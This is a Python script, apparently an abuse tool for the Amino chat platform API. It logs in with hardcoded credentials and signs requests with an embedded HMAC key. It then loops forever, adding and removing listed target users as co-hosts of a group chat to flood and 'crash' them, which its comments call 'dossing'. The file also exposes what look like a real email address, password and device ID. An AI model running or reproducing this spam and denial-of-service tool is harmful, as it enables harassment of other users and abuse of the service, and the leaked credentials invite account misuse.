from concurrent.futures import ThreadPoolExecutor
from requests import get
from hashlib import sha1
from os import path
import json, time
import aiohttp
import asyncio 
import base64
import hmac

THIS_FOLDER = path.dirname(path.abspath(__file__))
targets = path.join(THIS_FOLDER, 'Target.txt')
with open(targets, 'r') as file:
    targetlinks = file.read().splitlines()

class FromLink:
    def __init__(self, data):
        self.json = data
        self.objectType = None

        self.objectId = None
        self.comId = None

    @property
    def FromCode(self):
        try:
            self.path = self.json["path"]
        except (KeyError, TypeError):
            pass
        try:
            self.objectType = self.json["extensions"]["linkInfo"]["objectType"]
        except (KeyError, TypeError):
            pass
        try:
            self.objectId = self.json["extensions"]["linkInfo"]["objectId"]
        except (KeyError, TypeError):
            pass
        try:
            self.comId = self.json["extensions"]["community"]["ndcId"]
        except (KeyError, TypeError):
            try:
                self.comId = self.json["extensions"]["linkInfo"]["ndcId"]
            except (KeyError, TypeError):
                pass
        return self


class Account():
    def __init__(self, accountline, session):
        self.authenticated = False
        self.email = accountline["email"]
        self.password = accountline["password"]
        self.device_id = accountline["device"]
        self.session = session
        self.target_user = []
        self.hostgc = None
        self.cid = None
        self.sid = None
        self.uid = None
        self.api = 'https://service.narvii.com/api/v1'

    async def generate_headers(self, data=None, content_type=None, sig=None):
        headers = {
            'NDCDEVICEID': self.device_id,
            'Accept-Language': 'en-US',
            'Content-Type': 'text/html',
            'User-Agent':
            'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/star2ltexx-user 7.1.; com.narvii.amino.master/3.4.33602)',
            'Host': 'service.narvii.com',
            'Accept-Encoding': 'gzip',
            'Connection': 'Keep-Alive'
        }
        if data:
            headers['content_type-Length'] = str(len(data))
            if sig:
                headers['NDC-MSG-SIG'] = sig
        if self.sid:
            headers['NDCAUTH'] = f'sid={self.sid}'
        if content_type:
            headers["Content-Type"] = content_type
        return headers

    async def sig(self, data):
        signature = base64.b64encode(
            bytes.fromhex("52") +
            hmac.new(bytes.fromhex("EAB4F1B9E3340CD1631EDE3B587CC3EBEDF1AFA9"),
                     data.encode("utf-8"), sha1).digest()).decode("utf-8")
        return signature

    async def login(self):
        data = json.dumps({
            'email': self.email,
            'v': 2,
            'secret': f'0 {self.password}',
            'deviceID': self.device_id,
            'clientType': 100,
            'action': 'normal',
            'timestamp': int(time.time() * 1000)
        })
        async with self.session.post(f'{self.api}/g/s/auth/login',
                                     headers=await
                                     self.generate_headers(data=data,
                                                           sig=await
                                                           self.sig(data)),
                                     data=data) as response:
            response = await response.json()
            if response["api:statuscode"] == 0:
                pass
            else:
                raise Exception(response['api:message'])
            self.sid = response["sid"]
            self.uid = response["account"]["uid"]
            self.authenticated = True

    async def from_link(self, link):
        response = get(f"{self.api}/g/s/link-resolution?q={link}",
                       headers=await self.generate_headers()).json()
        if response["api:statuscode"] == 0:
            pass
        else:
            raise Exception(response['api:message'])
        x = FromLink(response["linkInfoV2"]).FromCode
        if x.objectType == 12:
            self.cid = x.comId
            self.hostgc = x.objectId
        else:
            self.target_user.append(x.objectId)

    async def set(self, uid):
        data = json.dumps({
            "uidList": [uid],
            "timestamp": int(time.time() * 1000)
        })
        async with self.session.post(
                f"{self.api}/x{self.cid}/s/chat/thread/{self.hostgc}/co-host",
                data=data,
                headers=await
                self.generate_headers(data=data, sig=await
                                      self.sig(data))) as _:
            #response = await response.json()
            #print(response)
            #print(f"dossing {uid}")
            pass
            #if response["api:statuscode"] == 0:
                 #pass
            #else:
                 #raise Exception(response["api:message"])

    async def dele(self, uid):
        async with self.session.delete(
                f"{self.api}/x{self.cid}/s/chat/thread/{self.hostgc}/co-host/{uid}",
                headers=await self.generate_headers()) as _:
            #response = await response.json()
            #print(response)
            #(f"dossing {uid}")
            pass
            #if response["api:statuscode"] == 0:
                 #pass
            #else:
                 #raise Exception(response["api:message"])

    async def crash(self, uid):
        try:
            await self.set(uid)
            await self.dele(uid)
            print(f"Spamming {uid}")
        except Exception as e:
            print(f"error {e}")


async def itachi(acc: Account):
    crowd = []
    xo = len(acc.target_user)
    # for _ in range(10):
    with ThreadPoolExecutor(max_workers= 50000) as exe:
        _ = [
            exe.submit(
                crowd.append(
                    asyncio.create_task(acc.crash(acc.target_user[i % xo]))))
            for i in range(100)
        ]
    await asyncio.gather(*crowd)


async def main():
    
    email="Rahulggpro607@gmail.com" # enter email here
    password="Rahul@8826" # enter password here
    device="19EFD2929325DFE4B5437399BADFF2C918E53FC8635C18110764AA0A37D2084D5689E0B300A0CF892F" # enter secret here
    gclink="http://aminoapps.com/p/ae3kpq"  # enter gc link where you are set as host
    logdata = {"email": email, "password": password, "device": device}
    async with aiohttp.ClientSession() as session:
        client = Account(logdata, session)
        await client.login()
        await client.from_link(gclink)
        total = []
        for targetlink in targetlinks:
            total.append(asyncio.create_task(client.from_link(targetlink)))
        await asyncio.gather(*total)
        while True:
             task = []
             print(task)
             await itachi(client)
             for _ in range(100):
                 for uid in client.target_user:
                     task.append(asyncio.create_task(client.crash(uid)))
             await asyncio.gather(*task)


asyncio.get_event_loop().run_until_complete(main())
